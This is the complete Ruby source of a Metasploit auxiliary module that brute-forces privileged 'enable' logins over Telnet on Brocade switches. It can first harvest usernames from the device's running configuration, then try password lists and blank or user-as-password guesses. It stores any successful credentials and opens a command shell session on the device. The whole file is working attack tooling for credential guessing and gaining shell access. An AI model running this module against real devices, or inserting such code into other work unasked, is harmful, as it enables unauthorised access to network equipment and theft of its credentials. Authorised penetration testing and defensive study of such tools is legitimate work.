##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/telnet'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell

  def initialize
    super(
      'Name'        => 'Brocade Enable Login Check Scanner',
      'Description' => %q{
        This module will test a range of Brocade network devices for a
        privileged logins and report successes. The device authentication mode
        must be set as 'aaa authentication enable default local'.
        Telnet authentication, e.g. 'enable telnet authentication', should not
        be enabled in the device configuration.

        This module has been tested against the following devices:
              ICX6450-24 SWver 07.4.00bT311,
              FastIron WS 624 SWver 07.2.02fT7e1
      },
      'Author'      => 'h00die <mike[at]shorebreaksecurity.com>',
      'References'  =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )
    register_options(
      [
        OptBool.new('GET_USERNAMES_FROM_CONFIG', [ false, 'Pull usernames from config and running config', true])
      ], self.class
    )

    deregister_options('PASSWORD_SPRAY')

    @no_pass_prompt = []
  end

  def get_username_from_config(un_list,ip)
    ["config", "running-config"].each do |command|
      print_status(" Attempting username gathering from #{command} on #{ip}")
      sock.puts("\r\n") # ensure that the buffer is clear
      config = sock.recv(1024)
      sock.puts("show #{command}\r\n")

      # pull the entire config
      while true do
        sock.puts(" \r\n") # paging
        config << sock.recv(1024)
        # Read until we are back at a prompt and have received the 'end' of
        # the config.
        break if config.match(/>$/) and config.match(/end/)
      end

      config.each_line do |un|
        if un.match(/^username/)
          found_username = un.split(" ")[1].strip
          un_list.push(found_username)
          print_status("   Found: #{found_username}@#{ip}")
        end
      end
    end
  end

  attr_accessor :no_pass_prompt
  attr_accessor :password_only

  def run_host(ip)
    un_list = []
    if datastore['GET_USERNAMES_FROM_CONFIG']
        connect()
        get_username_from_config(un_list,ip)
        disconnect()
    end

    if datastore['USERNAME'] #put the provided username on the array to try
        un_list.push(datastore['USERNAME'])
    end

    un_list.delete('logout') #logout, even when used as a un or pass will exit the terminal

    un_list.each do |un|
      cred_collection = Metasploit::Framework::CredentialCollection.new(
          blank_passwords: datastore['BLANK_PASSWORDS'],
          pass_file: datastore['PASS_FILE'],
          password: datastore['PASSWORD'],
          user_file: datastore['USER_FILE'],
          userpass_file: datastore['USERPASS_FILE'],
          username: un,
          user_as_pass: datastore['USER_AS_PASS'],
      )

      cred_collection = prepend_db_passwords(cred_collection)

      scanner = Metasploit::Framework::LoginScanner::Telnet.new(
          host: ip,
          port: rport,
          proxies: datastore['PROXIES'],
          cred_details: cred_collection,
          stop_on_success: datastore['STOP_ON_SUCCESS'],
          bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
          connection_timeout: datastore['Timeout'],
          max_send_size: datastore['TCP::max_send_size'],
          send_delay: datastore['TCP::send_delay'],
          banner_timeout: datastore['TelnetBannerTimeout'],
          telnet_timeout: datastore['TelnetTimeout'],
          pre_login: lambda { |s| raw_send("enable\r\n", s.sock) },
          framework: framework,
          framework_module: self,
          ssl: datastore['SSL'],
          ssl_version: datastore['SSLVersion'],
          ssl_verify_mode: datastore['SSLVerifyMode'],
          ssl_cipher: datastore['SSLCipher'],
          local_port: datastore['CPORT'],
          local_host: datastore['CHOST']
      )

      scanner.scan! do |result|
        credential_data = result.to_h
        credential_data.merge!(
            module_fullname: self.fullname,
            workspace_id: myworkspace_id
        )

        if result.success?
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          print_good("#{ip}:#{rport} - Login Successful: #{result.credential}")
          start_telnet_session(ip,rport,result.credential.public,result.credential.private,scanner)
        else
          invalidate_login(credential_data)
          print_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})")
        end
      end
    end
  end

  def start_telnet_session(host, port, user, pass, scanner)
    print_status("Attempting to start session #{host}:#{port} with #{user}:#{pass}")
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => user,
      'PASSWORD'      => pass
    }

    start_session(self, "TELNET #{user}:#{pass} (#{host}:#{port})", merge_me, true, scanner.sock) if datastore['CreateSession']
  end
end
